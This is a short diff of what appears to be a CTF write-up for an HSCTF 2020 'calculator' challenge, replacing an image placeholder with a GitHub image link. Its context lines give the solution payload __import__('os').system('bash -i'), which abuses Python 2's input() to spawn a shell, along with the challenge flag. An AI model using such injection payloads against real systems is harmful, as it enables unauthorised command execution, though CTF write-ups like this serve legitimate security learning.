@@ -16,6 +16,6 @@ So just type this ```__import__('os').system('bash -i')``` in the input section 
 
 For more you info can read this [article1](https://medium.com/@GallegoDor/python-exploitation-1-input-ac10d3f4491f), [article2](http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html)
 
-[IMG]
+![image](https://github.com/0xw3bs3c/HSCTF2020/blob/arnab/misc/my_first_calculator/image1.png)
 
 **flag**: ```flag{please_use_python3}```
